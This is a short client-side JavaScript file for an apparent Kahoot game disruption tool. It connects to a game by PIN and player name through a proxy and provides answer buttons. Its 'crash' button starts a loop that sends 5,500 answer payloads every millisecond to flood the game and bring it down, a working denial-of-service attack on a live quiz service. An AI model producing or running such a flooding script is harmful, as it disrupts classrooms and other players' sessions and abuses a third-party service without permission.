var kahoot = null;
var runningTimer = null;
var proxy = document.location.href;
$('#activate-pin').click(function () {
    var originalText = $('#activate-pin').text();
    $('#activate-pin').text('Testing connection...').prop('disabled', function (i, v) {
        return !v;
    });
    kahoot = new Kahoot($('#pin').val(), $('#name').val(), proxy);
    kahoot.connect(function (data) {
        $('#activate-pin').prop('disabled', function (i, v) {
            return !v;
        });
        if (!data.error) {
            $('#login-panel').fadeOut(500, function () {
                updateSessionText();
                $('#control-panel').fadeIn(500);
            });
        } else {
            $('#activate-pin').animation('shake');
            $('#activate-pin').text(originalText);
        }
    });
});

$('#crash-btn').click(function () {
    if (runningTimer) {
        clearInterval(runningTimer);
        runningTimer = null;
    } else {
        runningTimer = setInterval(function () {
            for (var i = 0; i < 5500; i++) {
                if (runningTimer) {
                    kahoot.sendAnswerPayload(0);
                }
            }
        }, 1);
    }

});

$('#answer-0').click(function () {
    kahoot.sendAnswerPayload(0);
});

$('#answer-1').click(function () {
    kahoot.sendAnswerPayload(1);
});

$('#answer-2').click(function () {
    kahoot.sendAnswerPayload(2);
});

$('#answer-3').click(function () {
    kahoot.sendAnswerPayload(3);
});

function updateSessionText() {
    $('#pin-display').text('Pin: ' + kahoot.pin + ' - Name: ' + kahoot.name);
}